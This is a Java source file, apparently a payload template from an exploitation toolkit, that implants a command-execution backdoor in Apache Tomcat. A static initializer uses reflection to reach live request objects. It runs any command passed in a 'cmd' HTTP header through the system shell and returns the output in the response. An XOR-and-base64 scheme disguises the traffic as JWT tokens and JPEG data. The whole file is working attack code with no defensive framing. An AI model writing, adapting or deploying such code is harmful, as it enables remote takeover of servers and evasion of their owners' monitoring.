package jeg.core.template.tomcat;

import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Scanner;

// calc命令：eyJeXA10TbkhnteAiS0PtwRFQKqp5EYIIWXXXLKXDf5NPTs2M1FykATD[命令].eyJ82Df13d=
public class TomcatCmdExecTpl {

    static {
        try {
            new TomcatCmdExecTpl();
        } catch (Exception e) {
        }
    }

    public TomcatCmdExecTpl() throws Exception {
        run();
    }

    // 传参：需要执行的命令
    private String getReqHeaderName() {
        return "cmd";
    }


    private void run() {
        try {
            Method var0 = Thread.class.getDeclaredMethod("getThreads", (Class[]) (new Class[0]));
            var0.setAccessible(true);
            Thread[] var1 = (Thread[]) ((Thread[]) var0.invoke((Object) null));
            for (int var2 = 0; var2 < var1.length; ++var2) {
                if (var1[var2].getName().contains("http") && var1[var2].getName().contains("Acceptor")) {
                    Field var3 = var1[var2].getClass().getDeclaredField("target");
                    var3.setAccessible(true);
                    Object var4 = var3.get(var1[var2]);

                    try {
                        var3 = var4.getClass().getDeclaredField("endpoint");
                    } catch (NoSuchFieldException var15) {
                        var3 = var4.getClass().getDeclaredField("this$0");
                    }

                    var3.setAccessible(true);
                    var4 = var3.get(var4);

                    try {
                        var3 = var4.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException var14) {
                        try {
                            var3 = var4.getClass().getSuperclass().getDeclaredField("handler");
                        } catch (NoSuchFieldException var13) {
                            var3 = var4.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                        }
                    }

                    var3.setAccessible(true);
                    var4 = var3.get(var4);

                    try {
                        var3 = var4.getClass().getDeclaredField("global");
                    } catch (NoSuchFieldException var12) {
                        var3 = var4.getClass().getSuperclass().getDeclaredField("global");
                    }

                    var3.setAccessible(true);
                    var4 = var3.get(var4);
                    var4.getClass().getClassLoader().loadClass("org.apache.coyote.RequestGroupInfo");
                    if (var4.getClass().getName().contains("org.apache.coyote.RequestGroupInfo")) {
                        var3 = var4.getClass().getDeclaredField("processors");
                        var3.setAccessible(true);
                        ArrayList var5 = (ArrayList) var3.get(var4);

                        for (int var6 = 0; var6 < var5.size(); ++var6) {
                            var3 = var5.get(var6).getClass().getDeclaredField("req");
                            var3.setAccessible(true);
                            var4 = var3.get(var5.get(var6)).getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(var3.get(var5.get(var6)), 1);
                            String var7;
                            try {
                                var7 = (String) var3.get(var5.get(var6)).getClass().getMethod("getHeader", new Class[]{String.class}).invoke(var3.get(var5.get(var6)), new Object[]{getReqHeaderName()});
                                if (var7 != null) {
                                    Object response = var4.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(var4, new Object[0]);
                                    Writer writer = (Writer) response.getClass().getMethod("getWriter", new Class[0]).invoke(response, new Object[0]);
                                    writer.write(handle(var7));
                                    writer.flush();
                                    writer.close();
                                    break;
                                }
                            } catch (Exception ignored) {
                            }

                        }
                    }
                }
            }
        } catch (Throwable ignored) {
        }

    }

    // 执行模块
    private static String exec(String cmd) {
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private static String handle(String param) throws Exception {
        String encTag = "eyJeXA";
        
        String cmd = null;

        if (param.startsWith(encTag)) {
            // 控制混淆长度标识数量，字符1代表
            int num = Integer.parseInt(String.valueOf(param.charAt(encTag.length())));

            // 混淆字符串的总和长度
            int count = 0;
            for (int i = 0; i < num; i++) {
                count += param.charAt(encTag.length() + 1 + i);
            }

            // 请求参数格式：eyJ0eXA[string数字标识后面参数的长度][控制随机混淆字符串的长度ascii值][混淆字符串][xor+base64 命令字符串].[随机字符串]
            // param => base64decode => xor => exec() => xor => base64encode
            cmd = new String(x(base64Decode(param.substring(encTag.length() + 1 + num + count, param.indexOf(".")))));
            return "/9j/4A" + base64Encode(x(exec(cmd).getBytes())) + "/9k==";
        } else {
            return exec(param);
        }

    }

    private static byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }


    public static String base64Encode(byte[] input) throws Exception {
        String value = null;
        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, input);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = base64.newInstance();
            value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, input);
        }
        return value;
    }

    public static byte[] x(byte[] data) {
        byte[] key = "???????????????".getBytes();
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }
}
